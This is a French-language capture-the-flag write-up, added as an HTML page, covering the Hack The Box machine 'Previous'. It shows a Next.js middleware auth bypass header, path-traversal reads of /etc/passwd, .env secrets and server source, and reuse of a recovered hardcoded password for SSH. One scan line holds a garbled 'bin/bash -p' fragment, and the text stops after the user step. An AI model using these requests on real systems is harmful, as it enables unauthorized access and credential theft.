@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="fr" class="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Previous - Writeup HTB</title>
+    <meta name="description" content="Writeup Hack The Box - Previous">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans+Expanded:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="../writeups.css">
+    <link rel="icon" type="image/jpeg" href="../../assets/favi.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" defer></script>
+</head>
+
+<body class="writeups-mode">
+    <nav class="navbar">
+        <div class="container">
+            <div class="nav-content">
+                <a href="../../" class="nav-logo-link">
+                    <img src="../../assets/c8e38298-4426-4ed7-ab6b-1c8c5c263f64 (1).png" class="nav-logo"
+                        alt="logo signature Raphaël">
+                </a>
+                <div class="nav-links">
+                    <a href="../../" class="nav-link">Accueil</a>
+                    <a href="../" class="nav-link active">Writeups</a>
+                    <a href="../../Portfolio/" class="nav-link">Galerie</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="min-h-screen">
+        <div class="writeups-container">
+            <a href="../" class="back-link">← Retour aux writeups</a>
+            <div class="writeup-content">
+<header><h1 class="page-title" dir="auto">Previous</h1></header><div class="page-body"><div style="display:contents" dir="auto"><h1 id="2c2aa764-c45c-8013-bd8e-f1b207f09510" class="">User</h1></div><div style="display:contents" dir="auto"><pre id="2c1aa764-c45c-80fd-b06a-ce5947dfcf30" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/ctf/htb/en_cours $ nmap -sC -sV 10.10.11.83
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-06 20:02 +0100
+Nmap scan report for previous.htb (10.10.11.83)
+Host is up (0.024s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4bin/bash -p:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: PreviousJS
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds</code></pre></div><div style="display:contents" dir="auto"><pre id="2c1aa764-c45c-80c7-bb4f-c933baf2e7b5" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/ctf/htb/en_cours $ dirb http://previous.htb/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Dec  6 21:15:35 2025
+URL_BASE: http://previous.htb/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://previous.htb/ ----
++ http://previous.htb/api (CODE:307|SIZE:35)                                                                                                                                                        
++ http://previous.htb/apis (CODE:307|SIZE:36)                                                                                                                                                       
++ http://previous.htb/cgi-bin/ (CODE:308|SIZE:8)                                                                                                                                                    
++ http://previous.htb/docs (CODE:307|SIZE:36)                                                                                                                                                       
++ http://previous.htb/docs41 (CODE:307|SIZE:38)                                                                                                                                                     
++ http://previous.htb/docs51 (CODE:307|SIZE:38)                                                                                                                                                     
++ http://previous.htb/signin (CODE:200|SIZE:3481)                                                                                                                                                   
+                                                                                                                                                                                                    
+-----------------
+END_TIME: Sat Dec  6 21:17:53 2025
+DOWNLOADED: 4612 - FOUND: 7</code></pre></div><div style="display:contents" dir="auto"><pre id="2c1aa764-c45c-8080-98e7-d01ca18695d6" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/.cache/yay/naabu $ nuclei -target http://previous.htb/                                  
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.6.0
+
+		projectdiscovery.io
+
+[INF] nuclei-templates are not installed, installing...
+[INF] Successfully installed nuclei-templates at /home/ygp4ph/nuclei-templates
+[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
+[INF] Current nuclei version: v3.6.0 (latest)
+[INF] Current nuclei-templates version: v10.3.5 (latest)
+[INF] New templates added in latest release: 57
+[INF] Templates loaded for current scan: 8910
+[INF] Executing 8908 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 2 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 1862 (Reduced 1749 Requests)
+[INF] Using Interactsh Server: oast.pro
+[waf-detect:nginxgeneric] [http] [info] http://previous.htb/
+[ssh-server-enumeration] [javascript] [info] previous.htb:22 [&quot;SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13&quot;]
+[ssh-password-auth] [javascript] [info] previous.htb:22
+[ssh-sha1-hmac-algo] [javascript] [info] previous.htb:22
+[ssh-auth-methods] [javascript] [info] previous.htb:22 [&quot;[&quot;publickey&quot;,&quot;password&quot;]&quot;]
+[openssh-detect] [tcp] [info] previous.htb:22 [&quot;SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13&quot;]
+[old-copyright] [http] [info] http://previous.htb/ [&quot;\u00a9 2077&quot;]
+[http-missing-security-headers:permissions-policy] [http] [info] http://previous.htb/
+[http-missing-security-headers:x-frame-options] [http] [info] http://previous.htb/
+[http-missing-security-headers:x-content-type-options] [http] [info] http://previous.htb/
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://previous.htb/
+[http-missing-security-headers:clear-site-data] [http] [info] http://previous.htb/
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://previous.htb/
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://previous.htb/
+[http-missing-security-headers:content-security-policy] [http] [info] http://previous.htb/
+[http-missing-security-headers:referrer-policy] [http] [info] http://previous.htb/
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://previous.htb/
+[http-missing-security-headers:strict-transport-security] [http] [info] http://previous.htb/
+[nginx-eol:version] [http] [info] http://previous.htb/ [&quot;1.18.0&quot;]
+[nginx-version] [http] [info] http://previous.htb/ [&quot;nginx/1.18.0&quot;]
+[options-method] [http] [info] http://previous.htb/ [&quot;GET&quot;,&quot;HEAD&quot;]
+[tech-detect:next.js] [http] [info] http://previous.htb/
+[tech-detect:nginx] [http] [info] http://previous.htb/
+[caa-fingerprint] [dns] [info] previous.htb
+[INF] Scan completed in 1m. 24 matches found.
+~/.cache/yay/naabu $ </code></pre></div><div style="display:contents" dir="auto"><pre id="2c1aa764-c45c-80b9-b839-e041f33665e7" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">/
+/signin
+/docs
+/docs/[section]
+/docs/components/layout
+/docs/components/sidebar
+/docs/content/examples
+/docs/content/getting-started
+/api
+/api/auth/callback/credentials
+/api/download</code></pre></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-8038-944a-f29dbc1f6993" class="">et ca c’est tous les chemins mentionnés dans les différents js</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-80cd-8a27-c7b7c498f7a9" class="">dans le code source tous les liens vers des js commencent par <code>/_next/static/chunks/</code> et apparemment c’est des lib nextjs ce qui parait logique vu le nom du site mdrr</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-80a8-9e32-e9be68c89227" class="">toutes ces pages demandent un login</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-80c5-9c10-e1d3b4aa534d" class="">sur la page on a un contact <code>jeremy@previous.htb</code> qui peut servir pour le login</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-8092-83f5-fdbd306f9d84" class="">tenter une sqli rien ne marche et le chargement est super long<br/>je dois tenter une auth bypass</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-80b9-a6e4-c30db95bb735" class="">je cherche nextjs auth bypass</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-80e6-a66e-f4a33fd4ab01" class=""><a href="https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass">https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass</a></p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-8034-b864-c93d3ee5c366" class="">PJ mes bb</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-8094-89a3-e0869e68a08d" class="">j’ai pas reussi a savoir quelle version c’est donc j’ai tout testé et celle la marche </p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-8078-84ba-fc87e08dbd53" class=""><a href="https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass#for-versions-1320-and-later">https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass#for-versions-1320-and-later</a></p></div><div style="display:contents" dir="auto"><pre id="2c1aa764-c45c-803a-8d02-db97552f56d8" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/ctf/htb/en_cours $ curl -I -X GET &#x27;http://previous.htb/docs&#x27; \
+-H &#x27;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#x27;
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sat, 06 Dec 2025 21:48:43 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 3353
+Connection: keep-alive
+X-Powered-By: Next.js
+ETag: &quot;83h4wb4nfw2l1&quot;
+Vary: Accept-Encoding</code></pre></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-8085-ab1e-ec678bac4275" class="">donc on est sur la version 13.2.0</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-8026-bc50-ed5414955931" class="">maintenant je le fais dans burp</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-809b-8511-de6c5ce01188" class="">je suis connecté</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-8011-b729-e416801a8053" class="">je navigues sur le site et dans la page d’exemples On observe que on peut telecharger des exemples</p></div><div style="display:contents" dir="auto"><pre id="2c1aa764-c45c-8041-81cb-df82b52e249f" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">&lt;p&gt;Download the full example &lt;a href=&quot;/api/download?example=hello-world.ts&quot;&gt;here&lt;/a&gt;!&lt;/p&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-8039-999f-dde14cbd7fc1" class="">lfi</p></div><div style="display:contents" dir="auto"><pre id="2c1aa764-c45c-80ac-8e80-d1ad1d64cfab" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/ctf/htb/en_cours $ curl &#x27;http://previous.htb/api/download?example=../../../../../../../../etc/passwd&#x27; \
+-H &#x27;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#x27;
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+node:x:1000:1000::/home/node:/bin/sh
+nextjs:x:1001:65533::/home/nextjs:/sbin/nologin</code></pre></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-80ba-b075-f0a45c3d8a23" class="">yen a que 2 qui ont un shell c’est root et node</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-802c-89da-fd8e786caaf3" class="">je dois naviguer dans le code source pour trouver une rce</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-80ce-a5e3-f5698468296f" class="">auth bypass &gt; lfi &gt; sourcecode &gt; rce &gt; revshell &gt; user &gt; root</p></div><div style="display:contents" dir="auto"><p id="2c1aa764-c45c-800a-a4ab-ee67e1ddc713" class="">verifier si l’interface est bien celle recommandée</p></div><div style="display:contents" dir="ltr"><figure id="2c1aa764-c45c-80a4-8e07-e0be44428b87" class="image"><a href="Previous/image.png"><img style="width:710px" src="image.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8006-bb7f-c0ab78a1b532" class=""><a href="https://nextjs.org/docs/app/getting-started/project-structure">https://nextjs.org/docs/app/getting-started/project-structure</a></p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80e3-801d-ee2fa80a9bcf" class="">Test avec le package json via la lfi en vain</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8022-b285-c5f6478a2482" class="">bon rien de ce que je cherche ne fonctionne</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-804d-bd7f-f2442e9b0a14" class="">je dois trouver des infos sur le code source de l’app</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8002-8813-ca4a35ffabeb" class="">je retourne explorer la page</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8096-945f-cb3a245246fe" class="">je telecharge le hello word complet</p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-80d2-ad1f-f57490b2048f" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">~/ctf/htb/en_cours $ curl &#x27;http://previous.htb/api/download?example=../../package.json&#x27; \ 
+-H &#x27;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#x27;
+{
+  &quot;private&quot;: true,
+  &quot;scripts&quot;: {
+    &quot;dev&quot;: &quot;next dev&quot;,
+    &quot;build&quot;: &quot;next build&quot;
+  },
+  &quot;dependencies&quot;: {
+    &quot;@mdx-js/loader&quot;: &quot;^3.1.0&quot;,
+    &quot;@mdx-js/react&quot;: &quot;^3.1.0&quot;,
+    &quot;@next/mdx&quot;: &quot;^15.3.0&quot;,
+    &quot;@tailwindcss/postcss&quot;: &quot;^4.1.3&quot;,
+    &quot;@tailwindcss/typography&quot;: &quot;^0.5.16&quot;,
+    &quot;@types/mdx&quot;: &quot;^2.0.13&quot;,
+    &quot;next&quot;: &quot;^15.2.2&quot;,
+    &quot;next-auth&quot;: &quot;^4.24.11&quot;,
+    &quot;postcss&quot;: &quot;^8.5.3&quot;,
+    &quot;react&quot;: &quot;^18.2.0&quot;,
+    &quot;react-dom&quot;: &quot;^18.2.0&quot;,
+    &quot;tailwindcss&quot;: &quot;^4.1.3&quot;
+  },
+  &quot;devDependencies&quot;: {
+    &quot;@types/node&quot;: &quot;22.14.0&quot;,
+    &quot;@types/react&quot;: &quot;19.1.0&quot;,
+    &quot;typescript&quot;: &quot;5.8.3&quot;
+  }
+}</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8082-95e2-d04b96dcf8fc" class="">ok enfaite il fallait tout simplemet utiliset un chemin relatif (j’etais en train de guess comme un abruti)</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-805d-8f5f-c3ca1a76a5db" class="">je cherche les variables d’environnement</p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-808c-96ea-f5e2e6c6c6e8" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/ctf/htb/en_cours $ curl &#x27;http://previous.htb/api/download?example=../../.env&#x27; \      
+-H &#x27;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#x27;
+NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a</code></pre></div><div style="display:contents" dir="ltr"><figure id="2c2aa764-c45c-80cc-a454-c1070b91099b" class="image"><a href="Previous/image%201.png"><img style="width:2212px" src="image%201.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80a9-941e-d4786982dde1" class=""><a href="https://www.jwt.io/">https://www.jwt.io/</a> token généré :</p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-8058-8400-d92299a72609" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqZXJlbXkiLCJlbWFpbCI6ImplcmVteUBwcmV2aW91cy5odGIiLCJhZG1pbiI6dHJ1ZSwiaWF0IjoxNTE2MjM5MDIyfQ.JS07CbQ534th6vJ4MExbyAT_DslRDIETnZsRIAe-nQE</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-803f-9e09-e4f7e1d6211c" class="">ça marche pas</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8067-8348-f56db07e76ab" class="">je continue d’explorer</p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-8023-a5c5-e4580c567b12" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/ctf/htb/en_cours $ curl &#x27;http://previous.htb/api/download?example=../../../../../../proc/self/cmdline&#x27; \
+-H &#x27;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#x27; \
+&gt; -o o
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    15 100    15   0     0   120     0  --:--:-- --:--:-- --:--:--   120
+~/ctf/htb/en_cours $ \cat o
+next-server (v%                                                                                                                                                                                      ~/ctf/htb/en_cours $ strings o</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8011-a741-f28b55adede5" class="">bon ..</p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-809d-b4f8-de7672d4f1e5" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">next-server (v
+~/ctf/htb/en_cours $ curl &#x27;http://previous.htb/api/download?example=../../../../../../proc/self/environ&#x27; \
+-H &#x27;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#x27; \
+-o o
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   216 100   216   0     0  1594     0  --:--:-- --:--:-- --:--:--  1588
+~/ctf/htb/en_cours $ cat o
+[bat warning]: Binary content from file &#x27;o&#x27; will not be printed to the terminal (but will be present if the output of &#x27;bat&#x27; is piped). You can use &#x27;bat -A&#x27; to show the binary file contents.
+~/ctf/htb/en_cours $ strings o                                                                            
+NODE_VERSION=18.20.8
+HOSTNAME=0.0.0.0
+YARN_VERSION=1.22.22
+SHLVL=1
+PORT=3000
+HOME=/home/nextjs
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+NEXT_TELEMETRY_DISABLED=1
+PWD=/app
+NODE_ENV=production</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80b0-ac65-d7ddbbf4be2f" class="">interessant je suis dans /app quand je fais ma lfi</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80dd-8c01-e6ecdcfd9d15" class="">je regarde tout ce qu’Il y a dans app</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8077-ade1-d044e31e326f" class=""><a href="https://nextjs.org/docs/app/getting-started/project-structure#nested-routes">https://nextjs.org/docs/app/getting-started/project-structure#nested-routes</a></p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8052-9e0d-e446255ed14b" class=""><a href="https://nextjs.org/docs/app/getting-started/layouts-and-pages">https://nextjs.org/docs/app/getting-started/layouts-and-pages</a></p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8073-8b07-cf839da763db" class="">on a les pages de l’app router</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8017-9df5-f9a3496de2cf" class="">apparamment <code>manifest.json</code> est autogénéré et sert au routage des requetes en prod</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-804c-b7b6-e650eb16c9a4" class="">Test avec avec <code>routes-manifest.json</code></p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-803d-9814-c6763f393c1e" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">~/ctf/htb/en_cours $ curl &#x27;http://previous.htb/api/download?example=../../.next/routes-manifest.json&#x27; \
+-H &#x27;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#x27;
+{
+  &quot;version&quot;: 3,
+  &quot;pages404&quot;: true,
+  &quot;caseSensitive&quot;: false,
+  &quot;basePath&quot;: &quot;&quot;,
+  &quot;redirects&quot;: [
+    {
+      &quot;source&quot;: &quot;/:path+/&quot;,
+      &quot;destination&quot;: &quot;/:path+&quot;,
+      &quot;internal&quot;: true,
+      &quot;statusCode&quot;: 308,
+      &quot;regex&quot;: &quot;^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$&quot;
+    }
+  ],
+  &quot;headers&quot;: [],
+  &quot;dynamicRoutes&quot;: [
+    {
+      &quot;page&quot;: &quot;/api/auth/[...nextauth]&quot;,
+      &quot;regex&quot;: &quot;^/api/auth/(.+?)(?:/)?$&quot;,
+      &quot;routeKeys&quot;: {
+        &quot;nxtPnextauth&quot;: &quot;nxtPnextauth&quot;
+      },
+      &quot;namedRegex&quot;: &quot;^/api/auth/(?&lt;nxtPnextauth&gt;.+?)(?:/)?$&quot;
+    },
+    {
+      &quot;page&quot;: &quot;/docs/[section]&quot;,
+      &quot;regex&quot;: &quot;^/docs/([^/]+?)(?:/)?$&quot;,
+      &quot;routeKeys&quot;: {
+        &quot;nxtPsection&quot;: &quot;nxtPsection&quot;
+      },
+      &quot;namedRegex&quot;: &quot;^/docs/(?&lt;nxtPsection&gt;[^/]+?)(?:/)?$&quot;
+    }
+  ],
+  &quot;staticRoutes&quot;: [
+    {
+      &quot;page&quot;: &quot;/&quot;,
+      &quot;regex&quot;: &quot;^/(?:/)?$&quot;,
+      &quot;routeKeys&quot;: {},
+      &quot;namedRegex&quot;: &quot;^/(?:/)?$&quot;
+    },
+    {
+      &quot;page&quot;: &quot;/docs&quot;,
+      &quot;regex&quot;: &quot;^/docs(?:/)?$&quot;,
+      &quot;routeKeys&quot;: {},
+      &quot;namedRegex&quot;: &quot;^/docs(?:/)?$&quot;
+    },
+    {
+      &quot;page&quot;: &quot;/docs/components/layout&quot;,
+      &quot;regex&quot;: &quot;^/docs/components/layout(?:/)?$&quot;,
+      &quot;routeKeys&quot;: {},
+      &quot;namedRegex&quot;: &quot;^/docs/components/layout(?:/)?$&quot;
+    },
+    {
+      &quot;page&quot;: &quot;/docs/components/sidebar&quot;,
+      &quot;regex&quot;: &quot;^/docs/components/sidebar(?:/)?$&quot;,
+      &quot;routeKeys&quot;: {},
+      &quot;namedRegex&quot;: &quot;^/docs/components/sidebar(?:/)?$&quot;
+    },
+    {
+      &quot;page&quot;: &quot;/docs/content/examples&quot;,
+      &quot;regex&quot;: &quot;^/docs/content/examples(?:/)?$&quot;,
+      &quot;routeKeys&quot;: {},
+      &quot;namedRegex&quot;: &quot;^/docs/content/examples(?:/)?$&quot;
+    },
+    {
+      &quot;page&quot;: &quot;/docs/content/getting-started&quot;,
+      &quot;regex&quot;: &quot;^/docs/content/getting\\-started(?:/)?$&quot;,
+      &quot;routeKeys&quot;: {},
+      &quot;namedRegex&quot;: &quot;^/docs/content/getting\\-started(?:/)?$&quot;
+    },
+    {
+      &quot;page&quot;: &quot;/signin&quot;,
+      &quot;regex&quot;: &quot;^/signin(?:/)?$&quot;,
+      &quot;routeKeys&quot;: {},
+      &quot;namedRegex&quot;: &quot;^/signin(?:/)?$&quot;
+    }
+  ],
+  &quot;dataRoutes&quot;: [],
+  &quot;rsc&quot;: {
+    &quot;header&quot;: &quot;RSC&quot;,
+    &quot;varyHeader&quot;: &quot;RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch&quot;,
+    &quot;prefetchHeader&quot;: &quot;Next-Router-Prefetch&quot;,
+    &quot;didPostponeHeader&quot;: &quot;x-nextjs-postponed&quot;,
+    &quot;contentTypeHeader&quot;: &quot;text/x-component&quot;,
+    &quot;suffix&quot;: &quot;.rsc&quot;,
+    &quot;prefetchSuffix&quot;: &quot;.prefetch.rsc&quot;,
+    &quot;prefetchSegmentHeader&quot;: &quot;Next-Router-Segment-Prefetch&quot;,
+    &quot;prefetchSegmentSuffix&quot;: &quot;.segment.rsc&quot;,
+    &quot;prefetchSegmentDirSuffix&quot;: &quot;.segments&quot;
+  },
+  &quot;rewriteHeaders&quot;: {
+    &quot;pathHeader&quot;: &quot;x-nextjs-rewritten-path&quot;,
+    &quot;queryHeader&quot;: &quot;x-nextjs-rewritten-query&quot;
+  },
+  &quot;rewrites&quot;: []
+}</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80a5-8a90-e34c9b4b66ce" class="">on a <code>&quot;page&quot;: &quot;/api/auth/[...nextauth]&quot;,</code></p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-8041-8e78-e37cec91f637" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">~/ctf/htb/en_cours $ curl &#x27;http://previous.htb/api/download?example=../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js&#x27; \
+-H &#x27;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#x27; \
+&gt; -o -
+&quot;use strict&quot;;(()=&gt;{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=&gt;{e.exports=r(5600)},5600:e=&gt;{e.exports=require(&quot;next/dist/compiled/next-server/pages-api.runtime.prod.js&quot;)},6435:(e,n)=&gt;{Object.defineProperty(n,&quot;M&quot;,{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:&quot;then&quot;in n&amp;&amp;&quot;function&quot;==typeof n.then?n.then(n=&gt;e(n,r)):&quot;function&quot;==typeof n&amp;&amp;&quot;default&quot;===r?n:void 0}}})},8667:(e,n)=&gt;{Object.defineProperty(n,&quot;A&quot;,{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES=&quot;PAGES&quot;,e.PAGES_API=&quot;PAGES_API&quot;,e.APP_PAGE=&quot;APP_PAGE&quot;,e.APP_ROUTE=&quot;APP_ROUTE&quot;,e.IMAGE=&quot;IMAGE&quot;,e}({})},9832:(e,n,r)=&gt;{r.r(n),r.d(n,{config:()=&gt;l,default:()=&gt;P,routeModule:()=&gt;A});var t={};r.r(t),r.d(t,{default:()=&gt;p});var a=r(3480),s=r(8667),i=r(6435);let u=require(&quot;next-auth/providers/credentials&quot;),o={session:{strategy:&quot;jwt&quot;},providers:[r.n(u)()({name:&quot;Credentials&quot;,credentials:{username:{label:&quot;User&quot;,type:&quot;username&quot;},password:{label:&quot;Password&quot;,type:&quot;password&quot;}},authorize:async e=&gt;e?.username===&quot;jeremy&quot;&amp;&amp;e.password===(process.env.ADMIN_SECRET??&quot;MyNameIsJeremyAndILovePancakes&quot;)?{id:&quot;1&quot;,name:&quot;Jeremy&quot;}:null})],pages:{signIn:&quot;/signin&quot;},secret:process.env.NEXTAUTH_SECRET},d=require(&quot;next-auth&quot;),p=r.n(d)()(o),P=(0,i.M)(t,&quot;default&quot;),l=(0,i.M)(t,&quot;config&quot;),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:&quot;/api/auth/[...nextauth]&quot;,pathname:&quot;/api/auth/[...nextauth]&quot;,bundlePath:&quot;&quot;,filename:&quot;&quot;},userland:t})}};var n=require(&quot;../../../webpack-api-runtime.js&quot;);n.C(e);var r=n(n.s=9832);module.exports=r})();%   </code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8083-8c14-f20bcce65182" class="">on a <code>e.password===(process.env.ADMIN_SECRET??&quot;MyNameIsJeremyAndILovePancakes&quot;)</code></p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-807a-ad16-cff1a886cf87" class=""><code>MyNameIsJeremyAndILovePancakes</code></p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8057-89f6-f15937985b9c" class="">d’ailleurs au debut j’ai eu raison pour jeremy</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8050-a182-c3a4878393b3" class="">ok ca fait 20 minutes que j’essaye de me connecter au site avec ces creds mais c’etait une simple password reuse donc Connexion SSH et j’ai le user</p></div><div style="display:contents" 